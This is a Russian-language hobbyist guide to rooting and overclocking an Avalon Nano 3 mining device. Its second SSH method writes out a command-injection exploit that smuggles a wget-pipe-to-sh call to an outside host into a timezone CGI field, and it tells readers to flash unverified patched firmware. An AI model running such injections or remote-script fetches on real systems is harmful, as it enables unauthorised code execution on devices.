# 🔧 Avalon Nano 3 - Полный Гайд по Взлому и Разгону

> **Версия прошивки:** 25103101 (и новее)  
> **Автор:** На основе исследований [orca.pet](https://orca.pet/nanojb/)  
> **Язык:** Русский / English

---

## ⚠️ Предупреждение

**Внимание!** Все действия вы выполняете на свой страх и риск. Разгон может привести к:
- Перегреву устройства
- Снижению срока службы ASIC-чипов
- Нестабильной работе
- Отказу в гарантии

Автор не несёт ответственности за любые последствия.

---

## 📋 Содержание

1. [Получение SSH доступа](#получение-ssh-доступа)
2. [Получение root прав](#получение-root-прав)
3. [Разгон майнера](#разгон-майнера)
4. [Снижение износа flash-памяти](#снижение-износа-flash-памяти)
5. [Проверка результатов](#проверка-результатов)
6. [Восстановление](#восстановление)
7. [Источники и документация](#источники-и-документация)

---

## 🔓 Получение SSH доступа

### Метод 1: Через патченную прошивку (рекомендуется)

**Важно:** На прошивке версии 25103101 уязвимость с часовым поясом **исправлена**. Единственный способ получить SSH — прошить модифицированную прошивку.

#### Шаг 1: Скачайте патченную прошивку

Найдите патченную прошивку с встроенным SSH (dropbear):
- Формат: `.swu` (для обновления через веб-интерфейс)
- Размер: ~50 MB

#### Шаг 2: Прошейте через SWUpdate

1. Откройте браузер и перейдите на: `http://YOUR_MINER_IP:9090/`
2. Перетащите файл `.swu` в область загрузки
3. Дождитесь завершения (~2-5 минут)
4. Майнер автоматически перезагрузится

#### Шаг 3: Подключитесь по SSH

```bash
# Логин: admin, Пароль: admin
ssh admin@YOUR_MINER_IP
# Пароль: admin
```

---

### Метод 2: Эксплойт через часовой пояс (НЕ РАБОТАЕТ на v25103101)

> ⚠️ Этот метод **не работает** на прошивке 25103101 и новее. Уязвимость исправлена.

На старых прошивках (24071801):

```bash
# Через curl
curl 'http://YOUR_MINER_IP/timezoneconf.cgi' \
  -b 'auth=ff0000ff4813494d137e1631bba301d5' \
  --data-raw 'timezone=%3Bwget%20http://orca.pet/nanojb/n.sh%20-O-%7Csh%3B'

# Или через консоль браузера (F12)
await fetch("/timezoneconf.cgi", {
  "body": "timezone=" + encodeURIComponent(";wget http://orca.pet/nanojb/n.sh -O-|sh;"),
  "method": "POST"
});
```

---

## 🔑 Получение root прав

После подключения по SSH:

```bash
# Переход в режим суперпользователя
sudo -i
# Пароль: admin (тот же, что и для SSH)
```

**Проверка прав:**
```bash
whoami
# Должно вывести: root
```

---

## ⚡ Разгон майнера

### Параметры разгона

| Параметр | Диапазон | Описание |
|----------|----------|----------|
| `--avalon10-freq` | 25-800 MHz | Частота ASIC-чипов |
| `--avalon10-voltage` | 1150-1450 mV | Напряжение питания |
| `--avalon10-freq-sel` | 0-4 | Уровень частоты |
| `work_level` | 0-2 | Режим работы (0=Low, 1=Medium, 2=High) |

### Рекомендуемые профили

| Профиль | Частота | Напряжение | Хешрейт | Температура | Риск |
|---------|---------|------------|---------|-------------|------|
| **Стоковый** | 500 MHz | 1200 mV | ~4 TH/s | 50-60°C | Минимальный |
| **Лёгкий** | 550 MHz | 1225 mV | ~4.5 TH/s | 55-65°C | Низкий |
| **Средний** | 600 MHz | 1250 mV | ~5.5 TH/s | 60-70°C | Средний |
| **Высокий** | 650 MHz | 1275 mV | ~6.5 TH/s | 65-75°C | Высокий |
| **Экстрим** | 700 MHz | 1300 mV | ~7.5 TH/s | 70-80°C | Очень высокий |

### Применение разгона

#### Шаг 1: Установите work_level

```bash
sudo -i
sed -i 's/work_level *= *.*/work_level = 2/' /data/usrcon/systemcfg.ini
cat /data/usrcon/systemcfg.ini | grep work_level
# Должно вывести: work_level = 2
```

#### Шаг 2: Добавьте параметры разгона

```bash
# Резервная копия
cp /etc/init.d/rcS /etc/init.d/rcS.bak

# Добавление параметров (700 MHz / 1300 mV)
sed -i 's|^\./btcminer .*|./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api \&|' /etc/init.d/rcS

# Проверка
grep btcminer /etc/init.d/rcS
# Должно вывести: ./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api &
```

#### Шаг 3: Перезагрузите майнер

```bash
reboot
```

---

## 💾 Снижение износа flash-памяти

### Патч 1: Логи в RAM

По умолчанию логи записываются во flash-память, что сокращает её срок службы. Перенесём логи в оперативную память:

```bash
sudo -i

# Создание симлинка
if ! [ -L /data/log ]; then
  rm -rf /data/log
  ln -s /tmp/zlog /data/log
fi
mkdir -p /tmp/zlog

# Проверка
ls -la /data/log
# Должно вывести: lrwxrwxrwx ... /data/log -> /tmp/zlog
```

### Патч 2: Отключение истории команд

Отключаем сохранение истории команд bash (также записывается во flash):

```bash
sudo -i
echo "export HISTFILE=" | tee /etc/profile.d/no-history.sh

# Проверка
cat /etc/profile.d/no-history.sh
# Должно вывести: export HISTFILE=
```

---

## ✅ Проверка результатов

### Проверка процесса btcminer

```bash
ps aux | grep btcminer
# Должно вывести: ./btcminer --avalon10-freq 700 --avalon10-voltage 1300 --listen-api
```

### Проверка хешрейта через API cgminer

```bash
# Подключение к API
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings

# Пример вывода:
# "MHS 5s":7500000.00  (7.5 TH/s)
# "Freq":700.00
# "Temperature":75.00
```

### Проверка температуры и статуса

```bash
echo '{"command":"summary"}' | nc -w 3 YOUR_MINER_IP 4028 | strings
```

### Проверка work_level

```bash
cat /data/usrcon/systemcfg.ini | grep work_level
# Должно вывести: work_level = 2
```

### Проверка логов в RAM

```bash
ls -la /data/log
# Должно вывести: lrwxrwxrwx ... /data/log -> /tmp/zlog

ls -la /tmp/zlog
# Должны быть файлы логов
```

---

## 🔙 Восстановление

### Сброс разгона

```bash
sudo -i

# Сброс work_level
sed -i 's/work_level *= *.*/work_level = 0/' /data/usrcon/systemcfg.ini

# Сброс параметров btcminer
sed -i 's|^\./btcminer --avalon10.*|./btcminer \&|' /etc/init.d/rcS

# Проверка
grep btcminer /etc/init.d/rcS
# Должно вывести: ./btcminer &

reboot
```

### Полная перепрошивка

Если майнер не загружается:

1. Скачайте оригинальную прошивку из репозитория Canaan
2. Подключите майнер к ПК через USB, удерживая кнопку сброса
3. Прошейте через KendryteBurningTool

---

## 📚 Источники и документация

### Основные источники

| Ресурс | Описание |
|--------|----------|
| [orca.pet/nanojb/](https://orca.pet/nanojb/) | Полная документация по взлому Avalon Nano 3 |
| [GitHub: ckolivas/cgminer](https://github.com/ckolivas/cgminer) | Исходный код cgminer |
| [Canaan Kendryte](https://kendryte.com/) | Документация на SoC K230 |

### CGMiner API

**Порт:** 4028  
**Протокол:** JSON over TCP

#### Основные команды:

```bash
# Информация об устройствах
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028

# Информация о пулах
echo '{"command":"pools"}' | nc -w 3 YOUR_MINER_IP 4028

# Сводная информация
echo '{"command":"summary"}' | nc -w 3 YOUR_MINER_IP 4028

# Конфигурация
echo '{"command":"config"}' | nc -w 3 YOUR_MINER_IP 4028

# Перезапуск
echo '{"command":"restart"}' | nc -w 3 YOUR_MINER_IP 4028
```

#### Пример ответа API:

```json
{
  "STATUS": [
    {
      "STATUS": "S",
      "When": 1772984626,
      "Code": 9,
      "Msg": "1 ASC(s)",
      "Description": "cgminer 4.11.1"
    }
  ],
  "DEVS": [
    {
      "ASC": 0,
      "Name": "AVANANO",
      "ID": 0,
      "Enabled": "Y",
      "Status": "Alive",
      "Temperature": 75.00,
      "MHS 5s": 7500000.00,
      "MHS av": 7200000.00,
      "Freq": 700.00,
      "Accepted": 150,
      "Rejected": 2,
      "Hardware Errors": 0
    }
  ]
}
```

### Параметры командной строки btcminer

```bash
./btcminer [OPTIONS]

Основные опции:
  --avalon10-freq <MHz>        Частота ASIC (25-800)
  --avalon10-voltage <mV>      Напряжение (1150-1450)
  --avalon10-freq-sel <0-4>    Уровень частоты
  --listen-api                 Включить API (порт 4028)
  --help                       Показать справку
```

---

## 📁 Структура файлов майнера

```
/
├── etc/
│   ├── init.d/
│   │   └── rcS              # Скрипт инициализации (здесь btcminer)
│   └── profile.d/
│       └── no-history.sh    # Отключение истории
├── data/
│   ├── usrcon/
│   │   └── systemcfg.ini    # Конфигурация (work_level)
│   └── log -> /tmp/zlog     # Симлинк на RAM
├── tmp/
│   └── zlog/                # Логи в RAM
└── mnt/
    └── heater/
        └── www/
            └── html/        # Веб-интерфейс
```

---

## 🛠️ Полезные команды

```bash
# Перезагрузка майнера
reboot

# Проверка температуры
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep Temperature

# Проверка хешрейта
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep "MHS 5s"

# Проверка ошибок
echo '{"command":"devs"}' | nc -w 3 YOUR_MINER_IP 4028 | strings | grep "Hardware Errors"

# Просмотр логов
tail -f /tmp/zlog/btcminer.log

# Проверка запущенных процессов
ps aux

# Проверка свободной памяти
free -m
```

---

## 📞 Поддержка и обсуждение

- **Официальная тема:** [Avalon Nano 3 unofficial thread](https://bitcointalk.org/)
- **Документация:** [orca.pet/nanojb/](https://orca.pet/nanojb/)
- **GitHub Issues:** [Ваш репозиторий]

---

## 📝 Changelog

| Версия | Дата | Изменения |
|--------|------|-----------|
| 1.0 | 2026-03-08 | Начальная версия гайда |

---

**Удачи в разгоне! 🚀**

*Если гайд помог вам, поставьте ⭐ на GitHub!*

---

## 💰 Поддержать Проект

Если гайд помог вам, рассмотрите пожертвование: [**DONATE.md**](DONATE.md)

